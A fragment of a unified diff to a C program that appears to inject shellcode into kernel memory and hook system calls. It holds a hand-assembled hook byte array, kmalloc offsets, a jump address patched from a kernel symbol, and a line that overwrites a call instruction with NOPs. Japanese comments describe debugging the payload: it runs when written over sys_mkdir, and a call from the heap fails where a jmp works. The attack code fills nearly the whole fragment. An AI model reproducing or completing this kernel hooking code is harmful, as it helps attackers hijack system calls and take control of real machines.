@@ -7,6 +7,13 @@
 #include <sys/syscall.h>
 #include <unistd.h>
 
+/*
+ * 全てを書き直したほうがいいかもしれない
+ * - シェルコードをsys_mkdirの上に書き込めば問題なく実行するから、シェルコードは正しい。
+ * - ヒープに書き込んだシェルコードのcall命令をNOPに代えれば、問題なく実行する。
+ * - callは、ヒープからはだめみたい。jmpは大丈夫なのに。
+ */
+
 #define KMALLOC_SIZE            0x90 - 0x50
 #define OFFSET_M_WAIT           0x0c + 3
 #define OFFSET_MALLOC           0x18 + 1
@@ -46,7 +53,7 @@ unsigned char hook[] =
 /* 10: */ "\x50"                         /* push   rax                     */
 /* 11: */ "\x48\xbf\0\0\0\0\0\0\0\0"     /* mov    rdi,0x0                 */
 /* 1b: */ "\x48\xb8\0\0\0\0\0\0\0\0"     /* mov    rax,0x0                 */
-/* 25: */ /*"\xff\xd0"*/ "\x90\x90"                     /* call   rax                     */
+/* 25: */ "\xff\xd0"                     /* call   rax                     */
 /* 27: */ "\x58"                         /* pop    rax                     */
 /* 28: */ "\x5f";                        /* pop    rdi                     */
 
@@ -138,6 +145,10 @@ int main()
 	 	// -
 		// (chunk + OFFSET_HOOK_UPRINTF + sizeof(unsigned long));
 	*(unsigned long *)&jump[2] = nl[0].n_value + jmp_offset;
+
+
+	// call命令をNOPに替える
+ 	memset(&hook[0x25], 0x90, 2);
 
 	/*
 	 * チャンクの構成
